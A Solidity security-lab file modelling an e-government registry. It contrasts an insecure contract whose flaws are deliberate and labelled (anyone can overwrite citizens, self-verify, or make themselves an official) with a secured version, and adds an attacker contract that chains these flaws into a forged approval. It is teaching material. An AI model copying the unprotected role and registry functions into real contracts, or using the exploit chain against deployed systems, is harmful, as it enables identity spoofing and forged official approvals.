// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/**
 * SMART CONTRACT LAB: "e-Government"
 *
 * We model:
 *  - Citizen registry
 *  - Service requests (e.g., certificates, licenses)
 *  - Official approvals
 *
 * Contracts:
 *  - EGovernmentInsecure   (vulnerable)
 *  - Ownable               (utility)
 *  - EGovernmentSecure     (defended)
 *  - EGovernmentAttacker   (attacks EGovernmentInsecure)
 */

/*//////////////////////////////////////////////////////////////
//                  INSECURE E-GOVERNMENT
//////////////////////////////////////////////////////////////*/

contract EGovernmentInsecure {
    struct Citizen {
        string fullName;
        string homeAddress;   // stored in plaintext (privacy issue)
        bytes32 nationalId;   // could be raw ID or hash
        bool isVerified;
    }

    struct ServiceRequest {
        uint256 id;
        address citizen;
        string serviceType;   // e.g. "BirthCertificate", "BusinessLicense"
        string payload;       // full data stored on-chain (bad)
        bool approved;
        address approvedBy;
    }

    mapping(address => Citizen) public citizens;
    mapping(uint256 => ServiceRequest) public serviceRequests;
    mapping(address => bool) public isOfficial; // "gov" role, but no access control

    uint256 public nextRequestId;

    event CitizenRegistered(address indexed account, string name, string homeAddress, bytes32 nationalId);
    event CitizenUpdated(address indexed account, string name, string homeAddress, bytes32 nationalId, bool isVerified);
    event OfficialStatusSet(address indexed who, bool status);
    event ServiceRequested(uint256 indexed id, address indexed citizen, string serviceType);
    event ServiceApproved(uint256 indexed id, address indexed by);

    /**
     * ⚠️ VULN #1:
     * Anyone can register or overwrite ANY citizen account.
     */
    function registerCitizen(
        address account,
        string calldata fullName,
        string calldata homeAddress,
        bytes32 nationalId
    ) external {
        citizens[account] = Citizen({
            fullName: fullName,
            homeAddress: homeAddress,
            nationalId: nationalId,
            isVerified: false
        });

        emit CitizenRegistered(account, fullName, homeAddress, nationalId);
    }

    /**
     * ⚠️ VULN #2:
     * Anyone can update & verify ANY citizen.
     */
    function updateCitizen(
        address account,
        string calldata fullName,
        string calldata homeAddress,
        bytes32 nationalId,
        bool isVerified
    ) external {
        citizens[account] = Citizen({
            fullName: fullName,
            homeAddress: homeAddress,
            nationalId: nationalId,
            isVerified: isVerified
        });

        emit CitizenUpdated(account, fullName, homeAddress, nationalId, isVerified);
    }

    /**
     * ⚠️ VULN #3:
     * Anyone can grant themselves (or others) official status.
     * Then they can approve any service.
     */
    function setOfficial(address who, bool status) external {
        isOfficial[who] = status;
        emit OfficialStatusSet(who, status);
    }

    /**
     * Citizen creates a service request.
     * No validation of verified status, etc.
     */
    function createServiceRequest(
        string calldata serviceType,
        string calldata payload
    ) external returns (uint256) {
        uint256 id = nextRequestId++;
        serviceRequests[id] = ServiceRequest({
            id: id,
            citizen: msg.sender,
            serviceType: serviceType,
            payload: payload,
            approved: false,
            approvedBy: address(0)
        });

        emit ServiceRequested(id, msg.sender, serviceType);
        return id;
    }

    /**
     * ⚠️ VULN #4:
     * Only "isOfficial" is checked, but isOfficial itself is attacker-controlled.
     */
    function approveService(uint256 id) external {
        require(isOfficial[msg.sender], "NOT_OFFICIAL");
        ServiceRequest storage req = serviceRequests[id];
        require(req.citizen != address(0), "REQ_NOT_FOUND");

        req.approved = true;
        req.approvedBy = msg.sender;

        emit ServiceApproved(id, msg.sender);
    }

    /**
     * Naive helper:
     * Any verified citizen + approved service -> "trusted" digital record,
     * but all verification/approval states are easily spoofed.
     */
    function isTrustedEgovRecord(uint256 id) external view returns (bool) {
        ServiceRequest storage req = serviceRequests[id];
        if (!req.approved) return false;
        Citizen storage c = citizens[req.citizen];
        return c.isVerified;
    }
}

/*//////////////////////////////////////////////////////////////
//                           OWNABLE
//////////////////////////////////////////////////////////////*/

contract Ownable {
    address public owner;

    event OwnershipTransferred(address indexed oldOwner, address indexed newOwner);

    constructor() {
        owner = msg.sender;
        emit OwnershipTransferred(address(0), msg.sender);
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "NOT_OWNER");
        _;
    }

    function transferOwnership(address newOwner) external onlyOwner {
        require(newOwner != address(0), "ZERO_ADDRESS");
        emit OwnershipTransferred(owner, newOwner);
        owner = newOwner;
    }
}

/*//////////////////////////////////////////////////////////////
//                  SECURE E-GOVERNMENT
//////////////////////////////////////////////////////////////*/

contract EGovernmentSecure is Ownable {
    struct Citizen {
        bytes32 nationalIdHash; // hash of national ID (no raw ID)
        string fullName;
        string city;            // minimal location, not full address
        bool isVerified;
        bool exists;
    }

    struct ServiceRequest {
        uint256 id;
        address citizen;
        string serviceType;
        bytes32 payloadHash;    // hash of off-chain document/data
        bool approved;
        address approvedBy;
        bool exists;
    }

    mapping(address => Citizen) public citizens;
    mapping(uint256 => ServiceRequest) public serviceRequests;

    mapping(address => bool) public isRegistrar; // can register/verify citizens
    mapping(address => bool) public isOfficial;  // can approve services

    uint256 public nextRequestId;

    event RegistrarSet(address indexed account, bool allowed);
    event OfficialSet(address indexed account, bool allowed);
    event CitizenRegistered(address indexed account, bytes32 nationalIdHash, string fullName, string city);
    event CitizenVerified(address indexed account, bool isVerified);
    event ServiceRequested(uint256 indexed id, address indexed citizen, string serviceType, bytes32 payloadHash);
    event ServiceApproved(uint256 indexed id, address indexed by);

    modifier onlyRegistrar() {
        require(isRegistrar[msg.sender], "NOT_REGISTRAR");
        _;
    }

    modifier onlyOfficial() {
        require(isOfficial[msg.sender], "NOT_OFFICIAL");
        _;
    }

    /**
     * Admin configures registrars (e.g., government offices).
     */
    function setRegistrar(address account, bool allowed) external onlyOwner {
        require(account != address(0), "ZERO_ADDRESS");
        isRegistrar[account] = allowed;
        emit RegistrarSet(account, allowed);
    }

    /**
     * Admin configures officials (e.g., ministry officers).
     */
    function setOfficial(address account, bool allowed) external onlyOwner {
        require(account != address(0), "ZERO_ADDRESS");
        isOfficial[account] = allowed;
        emit OfficialSet(account, allowed);
    }

    /**
     * Registrar registers a citizen with hashed national ID.
     */
    function registerCitizen(
        address account,
        bytes32 nationalIdHash,
        string calldata fullName,
        string calldata city
    ) external onlyRegistrar {
        require(account != address(0), "BAD_ACCOUNT");
        Citizen storage c = citizens[account];
        require(!c.exists, "CITIZEN_EXISTS");

        c.nationalIdHash = nationalIdHash;
        c.fullName = fullName;
        c.city = city;
        c.isVerified = false;
        c.exists = true;

        emit CitizenRegistered(account, nationalIdHash, fullName, city);
    }

    /**
     * Registrar verifies a citizen after KYC/identity checks.
     */
    function setCitizenVerified(address account, bool verified) external onlyRegistrar {
        Citizen storage c = citizens[account];
        require(c.exists, "NO_CITIZEN");
        c.isVerified = verified;
        emit CitizenVerified(account, verified);
    }

    /**
     * Citizen creates a service request; payload is off-chain (hash only).
     */
    function createServiceRequest(
        string calldata serviceType,
        bytes32 payloadHash
    ) external returns (uint256) {
        Citizen storage c = citizens[msg.sender];
        require(c.exists, "NOT_REGISTERED");

        uint256 id = nextRequestId++;
        serviceRequests[id] = ServiceRequest({
            id: id,
            citizen: msg.sender,
            serviceType: serviceType,
            payloadHash: payloadHash,
            approved: false,
            approvedBy: address(0),
            exists: true
        });

        emit ServiceRequested(id, msg.sender, serviceType, payloadHash);
        return id;
    }

    /**
     * Only officials can approve a service for a verified citizen.
     */
    function approveService(uint256 id) external onlyOfficial {
        ServiceRequest storage req = serviceRequests[id];
        require(req.exists, "REQ_NOT_FOUND");
        Citizen storage c = citizens[req.citizen];
        require(c.exists && c.isVerified, "CITIZEN_NOT_VERIFIED");

        req.approved = true;
        req.approvedBy = msg.sender;

        emit ServiceApproved(id, msg.sender);
    }

    /**
     * Trusted e-gov record:
     *  - request exists, approved
     *  - citizen exists and verified
     *  - approvedBy is an official
     */
    function isTrustedEgovRecord(uint256 id) external view returns (bool) {
        ServiceRequest storage req = serviceRequests[id];
        if (!req.exists || !req.approved) return false;

        Citizen storage c = citizens[req.citizen];
        if (!c.exists || !c.isVerified) return false;

        if (!isOfficial[req.approvedBy]) return false;

        return true;
    }
}

/*//////////////////////////////////////////////////////////////
//                           ATTACKER
//////////////////////////////////////////////////////////////*/

contract EGovernmentAttacker {
    EGovernmentInsecure public target;

    constructor(address _target) {
        target = EGovernmentInsecure(_target);
    }

    /**
     * Step 1: Create a fake citizen record for a victim address.
     */
    function spoofCitizen(
        address victim,
        string calldata fakeName,
        string calldata fakeAddress,
        bytes32 fakeNationalId
    ) public {
        target.registerCitizen(victim, fakeName, fakeAddress, fakeNationalId);
    }

    /**
     * Step 2: Mark attacker as official so they can approve anything.
     */
    function becomeOfficial() public {
        target.setOfficial(address(this), true);
    }

    /**
     * Step 3: Create a bogus service request as attacker.
     */
    function createFakeService(string calldata serviceType, string calldata payload) public returns (uint256) {
        return target.createServiceRequest(serviceType, payload);
    }

    /**
     * Step 4: Approve that service as "official".
     */
    function approveOwnService(uint256 id) public {
        target.approveService(id);
    }

    /**
     * Full exploit:
     *  1) spoof a citizen (or just use our own address)
     *  2) mark ourselves as official
     *  3) create a service request
     *  4) approve it as if a real gov officer did it
     */
    function fullAttack(
        address victim,
        string calldata fakeName,
        string calldata fakeAddress,
        bytes32 fakeNationalId,
        string calldata serviceType,
        string calldata payload
    ) external returns (uint256) {
        spoofCitizen(victim, fakeName, fakeAddress, fakeNationalId);
        becomeOfficial();
        uint256 id = createFakeService(serviceType, payload);
        approveOwnService(id);
        return id;
    }
}
